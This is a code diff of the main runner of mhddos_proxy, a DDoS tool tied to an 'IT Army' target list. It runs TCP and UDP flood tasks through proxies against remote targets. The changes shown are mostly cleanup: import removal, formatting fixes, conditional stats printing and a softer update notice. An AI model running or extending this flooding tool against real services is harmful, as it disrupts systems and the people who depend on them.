@@ -8,7 +8,7 @@ import socket
 import sys
 import time
 from threading import Event, Thread
-from typing import List, Optional, Union
+from typing import List, Union
 
 from src.cli import init_argparse
 from src.concurrency import safe_run
@@ -17,7 +17,6 @@ from src.core import (
     LOW_RPC, IT_ARMY_CONFIG_URL, REFRESH_OVERTIME, REFRESH_RATE, ONLY_MY_IP,
     FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
 )
-from src.dns_utils import resolve_all_targets
 from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood, AttackSettings
 from src.output import show_statistic, print_banner
 from src.proxies import ProxySet
@@ -27,7 +26,6 @@ from src.targets import Target, TargetsLoader
 
 WINDOWS = sys.platform == "win32"
 WINDOWS_WAKEUP_SECONDS = 0.5
-
 
 AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]
 
@@ -161,7 +159,7 @@ async def run_ddos(
             task = asyncio.create_task(FloodTaskSet(loop, flooder, scale).loop())
             # XXX: add stats for running/cancelled tasks with add_done_callback
             active_flooder_tasks.append(task)
-        
+
         for flooder in udp_flooders:
             task = asyncio.create_task(FloodTaskSet(loop, flooder).loop())
             active_flooder_tasks.append(task)
@@ -191,14 +189,15 @@ async def run_ddos(
                     table,
                     use_my_ip,
                     num_proxies,
-                    None if targets_loader.age is None else reload_after-int(targets_loader.age),
+                    None if targets_loader.age is None else reload_after - int(targets_loader.age),
                     passed > REFRESH_RATE * REFRESH_OVERTIME,
                 )
             finally:
                 cycle_start = time.perf_counter()
 
     # setup coroutine to print stats
-    tasks.append(loop.create_task(stats_printer()))
+    if debug or table:
+        tasks.append(loop.create_task(stats_printer()))
 
     async def reload_targets(delay_seconds: int = 30):
         while True:
@@ -276,7 +275,7 @@ async def start(args, shutdown_event: Event):
     is_old_version = not await is_latest_version()
     if is_old_version:
         logger.warning(
-            f"{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: "
+            f"{cl.RED}Доступна нова версія - рекомендовано оновитися{cl.RESET}: "
             "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
         )
 
@@ -296,9 +295,9 @@ async def start(args, shutdown_event: Event):
         transport=args.advanced_default_transport,
         dest_connect_timeout_seconds=10,
         drain_timeout_seconds=0.2,
-        high_watermark = 1024 << 2, # roughly 4 packets (normally 1024 bytes on a single write)
+        high_watermark=1024 << 2,  # roughly 4 packets (normally 1024 bytes on a single write)
         # note that "generic flood" attacks switch reading off completely
-        reader_limit = 1024 << 6,
+        reader_limit=1024 << 6,
     )
 
     # XXX: with the current implementation there's no need to
